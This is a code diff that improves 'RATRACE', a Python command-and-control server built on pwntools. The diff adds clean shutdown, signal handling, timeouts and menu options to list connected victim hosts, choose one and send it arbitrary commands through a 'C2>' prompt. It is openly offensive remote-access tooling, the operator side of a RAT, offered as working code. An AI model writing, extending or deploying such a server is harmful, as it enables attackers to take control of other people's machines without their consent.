@@ -1,5 +1,9 @@
 import socket
 import threading
+import atexit
+import signal
+import os
+import time
 from pwn import *
 
 class C2Server:
@@ -16,34 +20,50 @@ class C2Server:
 		if self.server:
 			self.server.close()
 		self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		self.server.bind((self.host, self.port))
 		self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 		self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
+		self.server.bind((self.host, self.port))
 		self.server.listen(10)
+		self.server.settimeout(1.0)
 		self.listening = log.waitfor(f"{self.host}:{self.port} Status", status = 'Listening')
-
+		self.listening.success()
 		while self.running:
 			try:
 				client_socket, addr = self.server.accept()
 				log.info(f"Accepted connection from {addr[0]}:{addr[1]}")
-				status.success()
 				self.clients.append(client_socket)
-			except:
+			except socket.timeout:
+				continue
+			except OSError:
 				break
 
 	def stop(self):
 		self.running = False
-		self.listening.success()
-		self.server.close()
+		if self.server:
+			try:
+				self.server.shutdown(socket.SHUT_RDWR)
+			except OSError:
+				pass
+			self.server.close()
+			self.server= None
+		for client in self.clients:
+			try:
+				client.close()
+			except OSError:
+				pass
+		self.clients.clear()
+		if self.listening:
+			self.listening.success()
 
-	def select_client(self):
+
+	def select_client(self, choice):
 		if not self.clients:
 			return None
-		self.current_client_index = (self.current_client_index + 1) % len(self.clients)
+		self.current_client_index = choice
 		return self.clients[self.current_client_index]
 
 	def send_command(self, command):
-		client = self.select_client()
+		client = self.select_client(self.current_client_index)
 		if not client:
 			log.info("[!] No active clients")
 			return
@@ -62,13 +82,28 @@ class C2Server:
 
 
 if __name__ == "__main__":
-	items = ["Start Server","option2", "option3"]
+	items = ["Start Server","Check Clients", "Connect to Client", "Exit"]
 	running = False
 	server = C2Server()
 	server_thread = None
-	while True:
+
+	atexit.register(server.stop)
+
+	def handle_sigint(sig, frame):
+		log.info("Caught CTRL + C, Shutting Down")
+		server.stop()
+		exit(0)
+	signal.signal(signal.SIGINT, handle_sigint)
+
+	def resetgui():
+		time.sleep(0.01)
+		input("\nPress enter to continue...")
+		os.system("clear")
+
+	ratrace = True
+	while ratrace:
 		choice = options('Welcome to RATRACE - Make your Selection', items)
-		if choice == 0:
+		if choice == 0:		#Start / Stop Server
 			if not running:
 				server.running = True
 				server_thread = threading.Thread(target=server.start)
@@ -80,6 +115,42 @@ if __name__ == "__main__":
 				server.stop()
 				items[0] = "Start Server"
 				running = False
+		elif choice == 1: 	 #List Clients
+			if len(server.clients) > 0:
+				log.info("FORMAT: ('REMOTE ADDR', REMOTE PORT)")
+				for client in server.clients:
+					format = str(client).split("raddr=")
+					format = format[1].strip(">")
+					log.info(format)
+			else:
+				log.info("No clients connected")
+
+		elif choice == 2:
+			if len(server.clients) > 0:
+				targets = []
+				for client in server.clients:
+					format = str(client).split("raddr=")
+					format = format[1].strip(">")
+					targets.append(format)
+				target = options('Select a client:', targets)
+				server.select_client(target)
+				run = True
+				runstatus = log.waitfor(f"Connected to {targets[target]} | enter 'return' to quit | STATUS = ", status = "Commanding")
+				while run:
+					command = str_input('C2> ')
+					if command == "return":
+						run = False
+					else:
+						server.send_command(command)
+				runstatus.success()
+			else:
+				log.info("No clients connected")
+		else:
+			resetgui()
+			ratrace = False
+			splash()
+		resetgui()
+
 
 		#command = str_input('C2> ')
 		#server.send_command(command)
